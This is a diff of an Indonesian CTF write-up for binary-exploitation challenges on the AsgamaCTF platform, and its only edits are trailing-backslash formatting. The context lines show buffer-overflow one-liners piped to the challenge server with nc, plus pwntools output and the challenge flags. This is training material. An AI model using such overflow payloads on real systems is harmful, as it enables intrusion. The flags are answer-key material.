@@ -16,7 +16,7 @@ AsgamaCTF adalah platform yang disediakan oleh Universitas Gajah Maja untuk baha
 - Binary Exploitation
 - Dan Lain-Lain.
 
-Berikut write-up beberapa challenge kategori Binary Exploitation. 
+Berikut write-up beberapa challenge kategori Binary Exploitation.\  
 
 ## Buffer1 [50 pts]
 
@@ -91,7 +91,7 @@ $ python -c 'print "A"*128 + "\x31\x73\x37\x13"' | nc asgama.web.id 40203
 GamaCTF{BufF3rR__0vErf10W__EZ}
 ```
 ### Flag
-`GamaCTF{BufF3rR__0vErf10W__EZ}`
+`GamaCTF{BufF3rR__0vErf10W__EZ}`\   
  
 
 ## Buffer2 [75 pts]
@@ -232,7 +232,7 @@ $
 [*] Closed connection to asgama.web.id port 40202
 ```
 ### Flag
-`GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}`
+`GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}`\    
 
 ## EZ 1 [100 pts]
 
@@ -308,7 +308,7 @@ $ python -c 'print "\x00"*132 + "\x31\x73\x37\x13"' | nc asgama.web.id 40210
 GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}
 ```
 ### Flag
-`GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}`
+`GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}`\  
 
 
 
@@ -417,7 +417,7 @@ $
 [*] Closed connection to asgama.web.id port 40209
 ```
 ### Flag
-`GamaCTF{R0P_r0P_FTW}`
+`GamaCTF{R0P_r0P_FTW}`\   
 
 ## Buffow [200 pts]
 
@@ -487,7 +487,7 @@ GamaCTF{Ini_Bukan_Flagnya}
 ```
 
 ### Flag
-```GamaCTF{Ini_Bukan_Flagnya}```
+```GamaCTF{Ini_Bukan_Flagnya}```\   
 
 ## Notes
 Sebagian solver diatas dibuat dengan bantuan dari pwntools yang bisa didownload [disini](https://github.com/Gallopsled/pwntools).
